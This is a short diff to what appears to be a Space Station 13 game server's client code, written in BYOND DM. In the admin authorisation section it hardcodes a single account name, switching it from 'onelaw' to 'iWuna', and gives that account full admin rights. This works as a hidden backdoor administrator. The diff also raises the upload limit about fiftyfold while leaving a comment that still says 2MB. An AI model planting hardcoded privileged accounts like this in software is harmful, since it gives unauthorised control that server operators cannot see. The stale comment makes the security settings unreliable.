@@ -1,7 +1,7 @@
 	////////////
 	//SECURITY//
 	////////////
-#define UPLOAD_LIMIT		2097152	//Restricts client uploads to the server to 2MB //Could not probably do with being lower.
+#define UPLOAD_LIMIT		100997152	//Restricts client uploads to the server to 2MB //Could not probably do with being lower.
 
 	/*
 	When somebody clicks a link in game, this Topic is called first.
@@ -131,9 +131,9 @@ var/next_external_rsc = 0
 	directory[ckey] = src
 
 	//Admin Authorisation
-	//var/localhost_addresses = list("1337.0.0.1", "::1")
-	if(src.ckey == "onelaw")
-		var/datum/admin_rank/localhost_rank = new("President", 65535)
+	//var/localhost_addresses = list("127.0.0.1", "::1")
+	if(src.ckey == "iWuna")
+		var/datum/admin_rank/localhost_rank = new("Host", 65535)
 		if(localhost_rank)
 			var/datum/admins/localhost_holder = new(localhost_rank, ckey)
 			localhost_holder.associate(src)
